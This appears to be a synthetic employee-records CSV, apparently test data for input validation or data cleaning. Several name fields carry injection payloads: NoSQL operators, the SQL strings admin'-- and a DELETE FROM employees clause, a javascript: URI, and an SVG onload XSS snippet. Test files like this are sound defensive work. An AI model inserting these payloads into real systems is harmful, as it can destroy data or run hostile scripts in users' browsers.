+EMP01564,Charlie Smith,44,98931,14,Sales,San Francisco,9.3,11,3,0
+EMP01345,Alice Williams,36,75311,6,Marketing,New York,7.1,12,4,0
+EMP01241,Charlie Garcia,34,65822,0,Marketing,Singapore,7.2,11,7,0
+EMP01013,Diana Garcia,22,78931,7,Sales,Berlin,6.1,9,8,0
+EMP01315,John Brown,35,82299,5,Marketing,San Francisco,4.3,10,4,0
+EMP01600,Bob Williams,41,54061,15,Operations,London,4.6,11,5,0
+EMP01387,John Garcia,50,70507,10,HR,London,5.6,18,4,0
+EMP01273,Alice Smith,35,49340,11,HR,San Francisco,6.7,50,2,0
+EMP01166,Jane Williams,41,61472,16,Engineering,Singapore,6.0,12,5,0
+EMP01793,Alice Jones,24,93078,5,HR,Tokyo,6.6,12,7,0
+EMP01646,Diana Williams,22,64427,4,Marketing,London,9.2,8,6,0
+EMP01484,Diana Johnson,28,59280,5,Sales,Singapore,4.0,10,6,0
+EMP01782,Charlie Johnson,38,54683,9,Engineering,San Francisco,5.8,18,9,1
+EMP01504,Bob Brown,29,85730,3,Engineering,Tokyo,5.2,12,6,0
+EMP01243,Jane Johnson,41,74229,8,Operations,Singapore,6.5,9,6,0
+EMP01566,Alice Williams,22,74453,4,HR,Tokyo,8.0,14,7,0
+EMP01562,Bob Williams,41,77391,9,Operations,Singapore,6.7,12,5,0
+EMP01686,Jane Garcia,33,46632,11,HR,London,7.4,11,7,0
+EMP01189,Jane Williams,22,75537,13,HR,London,7.4,11,5,0
+EMP01699,Bob Johnson,33,86850,1,Marketing,San Francisco,8.4,12,3,0
+EMP01475,Charlie Williams,33,77834,6,Operations,New York,6.1,15,5,0
+EMP01681,Diana Garcia,25,67543,5,Finance,Berlin,7.7,17,3,0
+EMP01510,Jane Garcia,37,74499,5,Finance,London,6.7,13,8,0
+EMP01058,Alice Johnson,37,63955,3,Marketing,Berlin,8.2,14,1,1
+EMP01474,{'$ne': null},48,99261,5,Engineering,New York,7.5,3,5,0
+EMP01560,Jane Williams,37,74693,3,Engineering,Singapore,6.3,16,3,0
+EMP01747,admin'--,28,81035,4,HR,Berlin,6.4,16,6,1
+EMP01252,Jane Johnson,51,84880,3,Operations,Singapore,8.3,14,5,0
+EMP01021,Jane Williams,33,103186,2,Finance,New York,9.3,10,6,0
+EMP01313,John Johnson,41,84913,10,Finance,Berlin,5.4,10,4,0
+EMP01459,Bob Jones,25,73884,8,Finance,Tokyo,7.8,14,4,0
+EMP01160,Bob Williams,27,87854,14,HR,Berlin,6.0,7,2,0
+EMP01276,Charlie Garcia,36,43868,5,Engineering,Tokyo,8.0,9,3,0
+EMP01191,Diana Garcia,22,40000,27,Finance,New York,6.8,8,7,1
+EMP01385,Bob Williams,36,93815,10,Sales,Tokyo,7.0,15,6,0
+EMP01413,Alice Garcia,45,92898,4,Sales,New York,7.0,13,4,0
+EMP01491,Alice Brown,46,124859,9,Engineering,Tokyo,4.3,18,6,0
+EMP01343,John Garcia,30,77511,6,HR,London,8.3,10,1,1
+EMP01769,Diana Smith,49,64418,12,Finance,New York,6.9,10,6,0
+EMP01308,Charlie Williams,39,62524,3,Operations,Berlin,7.0,10,3,0
+EMP01661,Diana Williams,30,50514,9,Sales,London,7.0,12,6,0
+EMP01130,Charlie Johnson,22,63896,7,HR,London,8.2,21,6,0
+EMP01663,{'$gt': ''},30,57989,3,Operations,New York,6.7,10,10,1
+EMP01099,1'; DELETE FROM employees WHERE '1'='1,33,58661,8,Marketing,Singapore,8.0,11,7,1
+EMP01372,Bob Johnson,46,77084,10,Finance,Berlin,7.2,13,5,0
+EMP01087,javascript:alert('Hacked'),37,67814,8,Operations,London,7.4,8,4,1
+EMP01458,Charlie Williams,30,60899,9,Sales,Singapore,9.3,11,5,0
+EMP01330,Diana Jones,34,81427,3,HR,Berlin,9.3,15,5,0
+EMP01214,Jane Garcia,32,109719,6,Marketing,Singapore,8.4,20,2,0
+EMP01466,<svg onload=alert('XSS')>,39,72775,0,HR,New York,6.2,8,3,1
+EMP01121,Charlie Johnson,27,54469,6,Marketing,London,10.0,6,4,0
+EMP01614,Jane Brown,54,62129,6,Finance,San Francisco,6.6,16,9,1
+EMP01020,Alice Johnson,46,64654,8,Finance,New York,9.1,12,9,1
+EMP01700,Jane Johnson,30,500000,12,Engineering,Tokyo,6.4,12,6,1
+EMP01071,John Smith,47,59034,6,Marketing,New York,10.0,13,2,0
+EMP01106,Bob Jones,50,47802,10,Engineering,New York,10.0,14,9,1
+EMP01270,Charlie Jones,46,74061,3,HR,London,6.5,11,6,0
+EMP01435,Jane Brown,35,107782,19,Sales,San Francisco,7.1,19,4,0
+EMP01102,John Garcia,32,75574,10,Engineering,San Francisco,7.0,12,6,0
